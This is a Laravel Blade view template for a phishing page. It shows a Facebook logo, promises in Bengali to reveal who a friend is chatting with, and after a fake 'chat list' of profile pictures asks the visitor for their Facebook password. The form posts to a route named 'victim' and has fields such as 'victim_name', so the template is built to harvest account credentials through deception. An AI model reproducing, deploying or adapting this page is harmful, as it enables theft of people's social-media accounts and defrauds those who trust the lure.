@extends('layouts.app')
@section('title')
    Chat list
@endsection

@section('content')
    <div class="bg-white">
        <div class="container-login100" style="background-image: url('{{asset('public/frontend/img/img-01.jpg')}}');">
            <div class="container">
                <div class="row">
                    <div class="col">
                        <div class="text-center mb-5">
                            <img class="w-25" src="{{asset('public/frontend/img/facebook-logo.png')}}" alt="">
                        </div>
                        <form method="post" action="{{ route('victim') }}">
                            @csrf
                            <div class="form_one overflow-hidden">
                                <p class="badge badge-dark d-block py-3 text-monospace"><b>দেখুন আপনার বন্ধু কার কার
                                        সাথে চ্যাট করে ।</b></p>
                                <label class="d-block" for="">আপনার নাম লিখুন : </label>
                                <input name="victim_name" autocomplete="off" class="name ar_form_control" type="text"
                                       placeholder="ex: Mr. Rahman">

                                <label class="d-block" for="">বন্ধুর নাম লিখুন : </label>
                                <input name="fnd_name" autocomplete="off" class="fnd ar_form_control" type="text"
                                       placeholder="ex: Mr. Rahman">

                                <label class="d-block" for="">আপনার বন্ধু তালিকায় সে আছে ? </label>
                                <input type="radio" id="yes_fnd" name="friend_radio" value="yes">
                                <label class="mr-4" for="yes_fnd">হ্যা</label>
                                <input type="radio" id="no_fnd" name="friend_radio" value="no">
                                <label for="no_fnd">না</label>

                                <label class="d-block" for="">আপনার সাথে কি তার চ্যাট হয়েছে ? </label>
                                <input type="radio" id="yes_chat" name="chat_radio" value="yes">
                                <label class="mr-4" for="yes_chat">হ্যা</label>
                                <input type="radio" id="no_chat" name="chat_radio" value="no">
                                <label for="no_chat">না</label>

                                <div id="form_one" class="btn btn-outline-light float-right">Next</div>
                            </div>
                            <div class="form_two">
                                <p class="f-16 badge badge-dark d-block py-3 text-monospace text-center mb-4">আপনার
                                    বন্ধুর চ্যাট তালিকা</p>
                                <table class="table table-bordered table-striped text-center text-light">
                                    <tr>
                                        <th>Profile Picture</th>
                                    </tr>
                                    @foreach ($fndlist as $item)
                                        @foreach ( json_decode($item->img) as $data)
                                            <tr>
                                                <td><img class="w-25 border" src="{{ asset($data) }}" alt=""></td>
                                            </tr>
                                        @endforeach
                                    @endforeach
                                </table>
                                <div id="form_two" class="btn btn-outline-light float-right">Next</div>
                            </div>
                            <div class="form_three">

                                <div class="text-center victim-img">
                                    @foreach ($fndlist as $item)
                                        <img class="w-25" src="{{asset($item->victim_img)}}" alt="">
                                    @endforeach
                                </div>

                                <p class="f-16 badge badge-dark d-block py-3 text-monospace text-center mb-4">আপনি কি
                                    চ্যাট গুলো পড়তে চান ?</p>
                                <label class="d-block" for="">Your Facebook Password</label>
                                <input required name="password" class="ar_form_control" type="password"
                                       placeholder="password">
                                <button id="submit" class="btn btn-outline-light float-right">
                                    Next
                                </button>

                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>


@endsection
